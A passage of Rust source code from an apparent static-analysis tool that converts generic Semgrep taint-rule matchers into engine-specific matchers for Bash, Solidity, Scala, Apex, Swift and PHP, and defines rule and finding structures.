            method,
            description,
        } => bash_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => bash_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            bash_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => bash_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => bash_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => bash_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            bash_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => bash_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            bash_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => bash_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => bash_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => bash_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            bash_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => bash_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => bash_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            bash_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => bash_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            bash_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => bash_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => bash_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => bash_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => bash_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => bash_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => bash_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => bash_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Solidity taint spec.
fn to_solidity_spec(g: &GenericSpec) -> solidity_taint::TaintSpec {
    solidity_taint::TaintSpec {
        sources: g.sources.iter().map(to_solidity_matcher).collect(),
        sinks: g.sinks.iter().map(to_solidity_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_solidity_matcher).collect(),
    }
}

fn to_solidity_matcher(m: &GenericMatcher) -> solidity_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => solidity_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => solidity_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => {
            solidity_taint::NodeMatcher::ParamName {
                names: names.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodName {
            method,
            description,
        } => solidity_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => {
            solidity_taint::NodeMatcher::CallRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::MethodNameRegex { regex, description } => {
            solidity_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => solidity_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => {
            solidity_taint::NodeMatcher::FieldName {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::Subscript { base, description } => solidity_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            solidity_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => solidity_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            solidity_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => solidity_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => solidity_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => solidity_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            solidity_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }
        GenericMatcher::LooseEquality { description } => {
            solidity_taint::NodeMatcher::LooseEquality {
                description: description.clone(),
            }
        }
        GenericMatcher::TaintedCallee { description } => {
            solidity_taint::NodeMatcher::TaintedCallee {
                description: description.clone(),
            }
        }
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            solidity_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => solidity_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            solidity_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => solidity_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => solidity_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => solidity_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => solidity_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => solidity_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => solidity_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => solidity_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Scala taint spec.
fn to_scala_spec(g: &GenericSpec) -> scala_taint::TaintSpec {
    scala_taint::TaintSpec {
        sources: g.sources.iter().map(to_scala_matcher).collect(),
        sinks: g.sinks.iter().map(to_scala_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_scala_matcher).collect(),
    }
}

fn to_scala_matcher(m: &GenericMatcher) -> scala_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => scala_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => scala_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => scala_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => scala_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => scala_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            scala_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => scala_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => scala_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => scala_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            scala_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => scala_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            scala_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => scala_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => scala_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => scala_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            scala_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => scala_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => scala_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            scala_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => scala_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            scala_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => scala_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => scala_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => scala_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => scala_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => scala_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => scala_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => scala_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into an Apex taint spec.
fn to_apex_spec(g: &GenericSpec) -> apex_taint::TaintSpec {
    apex_taint::TaintSpec {
        sources: g.sources.iter().map(to_apex_matcher).collect(),
        sinks: g.sinks.iter().map(to_apex_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_apex_matcher).collect(),
    }
}

fn to_apex_matcher(m: &GenericMatcher) -> apex_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => apex_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => apex_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => apex_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => apex_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => apex_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            apex_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => apex_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => apex_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => apex_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            apex_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => apex_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            apex_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => apex_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => apex_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => apex_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            apex_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => apex_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => apex_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            apex_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => apex_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            apex_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => apex_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => apex_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => apex_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => apex_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => apex_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => apex_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => apex_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// Convert the generic spec into a Swift taint spec.
fn to_swift_spec(g: &GenericSpec) -> swift_taint::TaintSpec {
    swift_taint::TaintSpec {
        sources: g.sources.iter().map(to_swift_matcher).collect(),
        sinks: g.sinks.iter().map(to_swift_matcher).collect(),
        sanitizers: g.sanitizers.iter().map(to_swift_matcher).collect(),
    }
}

fn to_swift_matcher(m: &GenericMatcher) -> swift_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => swift_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => swift_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => swift_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => swift_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => swift_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            swift_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => swift_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => swift_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => swift_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        GenericMatcher::MemberAssign { field, description } => {
            swift_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => swift_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            swift_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => swift_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => swift_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => swift_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            swift_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => swift_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => swift_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            swift_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => swift_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            swift_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => swift_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => swift_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => swift_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => swift_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => swift_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => swift_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => swift_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

fn to_php_matcher(m: &GenericMatcher) -> php_taint::NodeMatcher {
    match m {
        GenericMatcher::Attribute {
            root,
            field,
            description,
        } => php_taint::NodeMatcher::Attribute {
            root: root.clone(),
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Call {
            canonical,
            description,
        } => php_taint::NodeMatcher::Call {
            canonical: canonical.clone(),
            description: description.clone(),
        },
        GenericMatcher::ParamName { names, description } => php_taint::NodeMatcher::ParamName {
            names: names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodName {
            method,
            description,
        } => php_taint::NodeMatcher::MethodName {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallRegex { regex, description } => php_taint::NodeMatcher::CallRegex {
            regex: regex.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodNameRegex { regex, description } => {
            php_taint::NodeMatcher::MethodNameRegex {
                regex: regex.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::ReceiverCall {
            receiver,
            description,
        } => php_taint::NodeMatcher::ReceiverCall {
            receiver: receiver.clone(),
            description: description.clone(),
        },
        GenericMatcher::FieldName { field, description } => php_taint::NodeMatcher::FieldName {
            field: field.clone(),
            description: description.clone(),
        },
        GenericMatcher::Subscript { base, description } => php_taint::NodeMatcher::Subscript {
            base: base.clone(),
            description: description.clone(),
        },
        // MemberAssign is JS-specific; included in the spec for completeness but
        // the PHP engine ignores it.
        GenericMatcher::MemberAssign { field, description } => {
            php_taint::NodeMatcher::MemberAssign {
                field: field.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::BinopFormat { description } => php_taint::NodeMatcher::BinopFormat {
            description: description.clone(),
        },
        GenericMatcher::ObjectLiteralValue { description } => {
            php_taint::NodeMatcher::ObjectLiteralValue {
                description: description.clone(),
            }
        }
        GenericMatcher::ReturnValue { description } => php_taint::NodeMatcher::ReturnValue {
            description: description.clone(),
        },
        GenericMatcher::TypedName {
            type_name,
            description,
        } => php_taint::NodeMatcher::TypedName {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::TypedAssignTarget {
            type_name,
            description,
        } => php_taint::NodeMatcher::TypedAssignTarget {
            type_name: type_name.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralString { description, regex } => {
            php_taint::NodeMatcher::LiteralString {
                description: description.clone(),
                regex: regex.clone(),
            }
        }

        GenericMatcher::LooseEquality { description } => php_taint::NodeMatcher::LooseEquality {
            description: description.clone(),
        },
        GenericMatcher::TaintedCallee { description } => php_taint::NodeMatcher::TaintedCallee {
            description: description.clone(),
        },
        GenericMatcher::TaintedSubscriptKey { base, description } => {
            php_taint::NodeMatcher::TaintedSubscriptKey {
                base: base.clone(),
                description: description.clone(),
            }
        }
        GenericMatcher::CallArgSource {
            method,
            arg_index,
            description,
        } => php_taint::NodeMatcher::CallArgSource {
            method: method.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::FirstParamSource { description } => {
            php_taint::NodeMatcher::FirstParamSource {
                description: description.clone(),
            }
        }
        GenericMatcher::DecoratedParamSource {
            decorator,
            description,
        } => php_taint::NodeMatcher::DecoratedParamSource {
            decorator: decorator.clone(),
            description: description.clone(),
        },
        GenericMatcher::CallArgConcat {
            method,
            description,
        } => php_taint::NodeMatcher::CallArgConcat {
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::ConstructorArgSink {
            class_names,
            arg_index,
            description,
        } => php_taint::NodeMatcher::ConstructorArgSink {
            class_names: class_names.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::PropertyAssignSink {
            property_names,
            description,
        } => php_taint::NodeMatcher::PropertyAssignSink {
            property_names: property_names.clone(),
            description: description.clone(),
        },
        GenericMatcher::MethodArgSink {
            methods,
            arg_index,
            description,
        } => php_taint::NodeMatcher::MethodArgSink {
            methods: methods.clone(),
            arg_index: *arg_index,
            description: description.clone(),
        },
        GenericMatcher::ReceiverProvenanceCall {
            init_receiver,
            init_method,
            init_arg,
            method,
            description,
        } => php_taint::NodeMatcher::ReceiverProvenanceCall {
            init_receiver: init_receiver.clone(),
            init_method: init_method.clone(),
            init_arg: init_arg.clone(),
            method: method.clone(),
            description: description.clone(),
        },
        GenericMatcher::LiteralArgCall {
            method,
            arg,
            description,
        } => php_taint::NodeMatcher::LiteralArgCall {
            method: method.clone(),
            arg: arg.clone(),
            description: description.clone(),
        },
    }
}

/// A compiled Semgrep `mode: taint` rule.
pub struct SemgrepTaintRule {
    pub id: String,
    pub message: String,
    pub severity: Severity,
    pub cwe: Option<String>,
    pub lang: Language,
    spec: GenericSpec,
    /// Compiled `pattern-not` constraints, partitioned by role. The
    /// post-filter in [`SemgrepTaintRule::check_with_context`] enforces
    /// the sink-side negatives against each finding's sink node.
    negatives: TaintNegatives,
    /// Compiled `pattern-inside` constraints, partitioned by role. The
    /// post-filter enforces the sink-side insides against each finding's
    /// sink node: a finding is kept only if its sink is inside one of them.
    insides: TaintInsides,
    /// Compiled `pattern-propagators` (the "argument taints receiver" subset).
    /// Applied by the Java and C# engines during their per-scope walk. Empty
    /// for rules with no propagators and for languages whose engine does not
    /// yet consult propagators (a documented false-negative, never a false
    /// positive).
    propagators: Vec<crate::rules::taint_engine::Propagator>,
    /// Compiled taint-**labels** policy (Semgrep advanced taint, `CONCAT`-family
    /// slice). `Some` only for the Java rules whose `label:`/`requires:` shape is
    /// the tractable single-positive-label form (see [`detect_label_policy`]);
    /// `None` for every unlabeled rule (unchanged behavior). Consulted only by
    /// the Java engine.
    label_policy: Option<crate::rules::taint_engine::LabelPolicy>,
}

/// Unified view over the three engine-specific `TaintFinding` types.
struct TaintFindingView {
    sink_start_byte: usize,
    sink_end_byte: usize,
    sink_line: usize,
    sink_column: usize,
    sink_end_line: usize,
    sink_end_column: usize,
    source_description: String,
    sink_description: String,
    source_line: usize,
    /// Byte range of the originating source node, when the engine tracked it.
    /// Consumed by the source-side `pattern-inside`/`pattern-not` post-filter.
    source_range: Option<(usize, usize)>,
    hops: u8,
}

impl TaintFindingView {
    fn from_python(f: python_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_js(f: javascript_taint::TaintFinding) -> Self {
        Self {
            sink_start_byte: f.sink_start_byte,
            sink_end_byte: f.sink_end_byte,
            sink_line: f.sink_line,
            sink_column: f.sink_column,
            sink_end_line: f.sink_end_line,
            sink_end_column: f.sink_end_column,
            source_description: f.source_description,
            sink_description: f.sink_description,
            source_line: f.source_line,
            source_range: f.source_range,
            hops: f.hops,
        }
    }
    fn from_go(f: go_taint::TaintFinding) -> Self {
        Self {
